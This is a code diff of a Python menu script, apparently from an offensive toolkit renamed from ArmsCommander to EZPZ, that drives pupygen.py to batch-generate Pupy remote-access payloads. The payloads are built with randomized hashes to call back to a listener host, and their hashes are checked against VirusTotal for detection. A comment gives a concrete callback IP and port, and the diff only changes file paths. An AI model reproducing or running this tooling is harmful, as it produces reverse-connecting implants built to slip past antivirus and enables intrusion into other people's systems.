@@ -10,7 +10,7 @@ from termcolor import colored
 import sys
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-os.system('cat /root/ArmsCommander/banners/TesterDisclaimer.txt')
+os.system('cat /root/EZPZ/banners/TesterDisclaimer.txt')
     # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
 	# - exe_86, exe_x64  : generate PE exe for windows
 # root@Cylon-Basestar:~/pupy/pupy# python /root/pupy/pupy/pupygen.py -f client -O windows -A x86 connect --host 52.53.180.45:443 -t ssl
@@ -161,7 +161,7 @@ def generate_tester_payloads():
                         host_Post = '8080'
                     # I found a bug in the main generator, where I forgot to add the Transport_Type tuple. That means everything in the release version was always generating SSL payloads
                     # but the main generator is the same as this, minus the for loops.
-                    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
+                    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/EZPZ/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
                         Format_Chosen, # 0
                         Operating_System, # 1
                         Architecture_Value, #2
@@ -180,7 +180,7 @@ def generate_tester_payloads():
 def check_VT():
     # Runs VT-notify, checks the hashes and see if any are found
     # however, by default, both GENERATOR and TESTER randomizes the payload hash
-    sample_directory = '/root/ArmsCommander/payloads/tester'
+    sample_directory = '/root/EZPZ/payloads/tester'
     cmd_String = "ruby /usr/share/veil-evasion/tools/vt-notify/vt-notify.rb -d %s" % sample_directory
     os.system(cmd_String)
     main()
@@ -235,7 +235,7 @@ def windows_only_payloads():
                     host_Post = '8080'
                 # I found a bug in the main generator, where I forgot to add the Transport_Type tuple. That means everything in the release version was always generating SSL payloads
                 # but the main generator is the same as this, minus the for loops.
-                cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
+                cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/EZPZ/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
                     Format_Chosen, # 0
                     Operating_System, # 1
                     Architecture_Value, #2
@@ -254,7 +254,7 @@ def windows_only_payloads():
     return
 
 def tester_server():
-    os.system('python /root/ArmsCommander/remoteexploits/TestAllListeners.py')
+    os.system('python /root/EZPZ/remoteexploits/TestAllListeners.py')
 def main():
     opt_List = [
         '\n\t#0. Return to Main Menu',
@@ -270,7 +270,7 @@ def main():
     opt_Choice = str(raw_input("Enter a OPTION: "))
 
     if opt_Choice == "0":
-        os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
+        os.system('python /root/EZPZ/remoteexploits/Pupy_Menu.py')
     elif opt_Choice == "1":
         os.system('clear')
         generate_tester_payloads()
@@ -279,7 +279,7 @@ def main():
         check_VT()
     elif opt_Choice == "3":
         os.system('clear')
-        os.system('nautilus /root/ArmsCommander/payloads/tester/'),
+        os.system('nautilus /root/EZPZ/payloads/tester/'),
     elif opt_Choice == "4":
         os.system('clear')
         windows_only_payloads()
